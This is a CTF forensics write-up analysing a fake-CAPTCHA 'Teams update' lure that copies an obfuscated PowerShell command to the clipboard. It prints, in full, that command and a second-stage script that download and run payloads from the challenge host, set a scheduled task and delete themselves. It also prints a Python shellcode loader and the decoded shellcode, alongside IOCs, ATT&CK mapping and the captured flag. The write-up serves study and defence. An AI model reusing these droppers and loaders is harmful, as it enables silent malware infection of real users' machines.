> **Platform Name**: Huntress CTF - 2025
> **Category**: #DFIR, #Forensics , #Malware
> **Date**: 10-03-2025
> **Author**: Joe Lipinski

---
## Table of Contents
1. [Case Overview](#case%20overview)
2. [Setup](#Setup)
3. [Evidence Inventory & Chain of Custody](#evidence%20inventory%20&%20chain%20of%20custody)
4. [Malware Analysis](#malware%20analysis)
5. [Indicators of Compromise (IOCs)](#indicators%20of%20compromise%20(IOCs))
6. [ATT&CK Mapping](#att&ck%20mapping)
7. [Findings & Flags](#findings%20&%20flags)
8. [Remediation & Recommendations](#remediation%20&%20recommendations)
9. [Lessons Learned](#lessons%20learned)

---
## Case Overview

**Background / Narrative:**  
"My computer said I needed to update MS Teams, so that is what I have been trying to do...
...but I can't seem to get past this CAPTCHA!

CAUTION
**This is the `Malware` category.** Please be sure to approach this challenge material within an isolated virtual machine.

NOTE
Some components of this challenge may be finicky with the _browser-based_ connection. You can still achieve what you need to, but there may be some more extra steps than if you were to approach this over the VPN.

> (_i.e., "remove the port" when you need to... you'll know what I mean_ 😜)"

---
## Setup
- **Operating System:** MacOS
- **Tools Used:** #browser, #VSCode, #Gemini
- **Network Configuration:** None

---
## Evidence Inventory & Chain of Custody
| ID  | Evidence Type | Filename / Source | Size   | Hash (SHA-256)                                                     | Received From | Date/Time (UTC)              |
| --- | ------------- | ----------------- | ------ | ------------------------------------------------------------------ | ------------- | ---------------------------- |
| E01 | Webpage       | `sample-1.html`   | 824 KB | `e19dee0e01ba61d3372596400d854e4b3fccfc18e7d6a9ea16946dc91f9e8815` | Source        | `October 2, 2025 6:45:30 PM` |
| E02 | Webpage       | `sample-2.txt`    | 1 KB   | a223dedff4425b908e5eb58fdf2d7d7a0cc15087da65b130424316b756245df1   | Source        | `October 2, 2025 6:50:39 PM` |
| E03 | PDF File      | `sample-3.pdf`    | 9.5 MB | `1014286cfd83f10a22f7ce9d4418b1c091cb45f135b6d3a7920110e5e067a83f` | Source        | `October 2, 2025 6:58:02 PM` |
| E04 | Python File   | `sample-3.py`     | 1 KB   | 5ce1c6674a96a060d0b3baa5f7d61f6d39bac2a9482a3ce470a4a8ccbef95b74   | Source        | `October 2, 2025 7:15:55 PM` |

---
## Malware Analysis
### Static Analysis

E01 was obtained from `https://c35b74dc.proxy.coursestack.com`, which contained a `unsecuredCopyToClipboard()` function with a base64 value:
```javascript
unsecuredCopyToClipboard(decodeURIComponent(escape(atob("IkM6XFdJTkRPV1Ncc3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxQb3dlclNoZWxsLmV4ZSIgLVdpIEhJIC1ub3AgLWMgIiRVa3ZxUkh0SXI9JGVudjpMb2NhbEFwcERhdGErJ1wnKyhHZXQtUmFuZG9tIC1NaW5pbXVtIDU0ODIgLU1heGltdW0gODYyNDUpKycuUFMxJztpcm0gJ2h0dHA6Ly9jMzViNzRkYy5wcm94eS5jb3Vyc2VzdGFjay5jb206NDQzLz90aWM9MSc+ICRVa3ZxUkh0SXI7cG93ZXJzaGVsbCAtV2kgSEkgLWVwIGJ5cGFzcyAtZiAkVWt2cVJIdElyIg=="))));
```

When decoded, the stored value is:
``` powershell
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://c35b74dc.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

Upon visiting `http://c35b74dc.proxy.coursestack.com:443/?tic=1`, the following txt file (E02) is returned:
``` powershell
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99); # decoded ".pyc"
$HMGDSHGSHSHS = [guid]::NewGuid();
$OIEOPTRJGS = $env:LocalAppData;irm 'http://c35b74dc.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;
Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");
$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;
$WQRGSGSD = "$HMGDSHGSHSHS";
$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";
$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";
$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";
$TDRBRTRNREN = (Get-Date).AddSeconds(180);
$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;
$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;
Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;
Set-Location $PIEVSDDGs;
$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD;
Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ;
iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');
Remove-Item $MyInvocation.MyCommand.Path -Force;
Set-Clipboard
```

Upon visiting `http://c35b74dc.proxy.coursestack.com:443/?tic=2`, a blank PDF is returned. According to the above text file, (E02) the PDF is actually a zip file. Converting the PDF to a Zip and decompressing it, results in a folder containing python compiled files (.pyc), python executables, windows .dll files, sub-folders and one python source file (`output.py`). Upon examining the `output.py` file (E04), the following source code is found:

``` python
import base64
#nfenru9en9vnebvnerbneubneubn
exec(base64.b64decode("aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp").decode('utf-8'))
#g0emgoemboemoetmboemomeio
```

Upon decoding the base64 data, the following code is found:

``` python
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
	decrypted_bytes = bytearray()
	key_length = len(key_bytes)
	for i, byte in enumerate(ciphertext_bytes):
	decrypted_byte = byte ^ key_bytes[i % key_length]
	decrypted_bytes.append(decrypted_byte)
	return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```

Upon executing the xor_decrypt python function in `output.py` (E04) file, a bytearray is returned:

``` python
bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d<$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')
```

Converting the code to hex using the code below, the hex value is returned
``` python
b = bytes(shellcode)
hex_str = b.hex()
print("HEX:", hex_str)
# Returned Hex: 5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3
```

After compiling  the hex code using an online [x86/x64 Assembler & Disassembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3&arch=x86-32&endianness=little&baddr=0x00000000&dis_with_addr=True&dis_with_raw=True&dis_with_ins=True#disassembly), the returned instruction set was analyzed using Google Gemini. It was found that the shellcode sets up a memory stack, pushes obfuscated data onto the stack, loops over the stack using XOR to decode the stack. After decoding, the code copies the resulting string to the local variable space it allocated in step 1. To hide its activity, the shellcode overwrites the first `$0x40$` (64) bytes on the stack, including the area where the decoded string was originally stored, with the byte `$0x01$`. 

---
## Indicators of Compromise (IOCs)
- **Files/Hashes:** `5ce1c6674a96a060d0b3baa5f7d61f6d39bac2a9482a3ce470a4a8ccbef95b74`
- **Domains/IPs/URLs/URIs:** `https://c35b74dc.proxy.coursestack.com:443/`
---
## ATT&CK Mapping
Map observed behaviors to ATT&CK (IDs + names), e.g.:
- *Initial Access* - **T1189** – Drive by Compromise 
- *Execution* - **T1053.005** – Scheduled Task/Job: Scheduled Task
- *Persistence* - **T1547.015** – Boot or Logon Autostart Execution: Login Items
- *Defense Evasion* - **T1027.009** – Obfuscated Files or Information: Embedded Payloads
- *Defense Evasion* - **T1027.013** – Obfuscated Files or Information: Encrypted/Encoded File
- *Defense Evasion* - **T1055.001** – Process Injection: Dynamic-link Library Injection
- *Defense Evasion* - **T1055.001** – Process Injection: Dynamic-link Library Injection

---
## Findings & Flags
**Narrative Summary (Executive-style):**  
- The website employed code that was able to covertly download a file containing computer instructions that bypassed security by obfuscating its instructions to set up a recurring service to be run on the exploited computer. A second-stage payload was also downloaded, disguised as a PDF file that contained the actual threatening code. The threatening code was run via a recurring service that was injected into the memory of the infected computer, allowing the malware to run without detection.
### Captured Flags

> [!flag]
> `flag{d341b8d2c96e9cc96965afbf5675fc26}`

---
## Remediation & Recommendations
- Containment steps: Remove the infected devices from the network.
- Eradication: Remove the related service from the device, and remove any code used to stage or execute the malware.
- Hardening: Block the domain associated with the malware, report the file signature of the malware, and update systems (EDR, SEIM, etc.) to check for the related malware signature.

---
## Lessons Learned
- I learned that converting the bytearray into hex and then disassembling the shellcode provided the assembly instructions that revealed what the malware did

---
**Disclaimer**  
For educational purposes only. Handle all evidence lawfully, preserve integrity, and follow the challenge’s ROE.
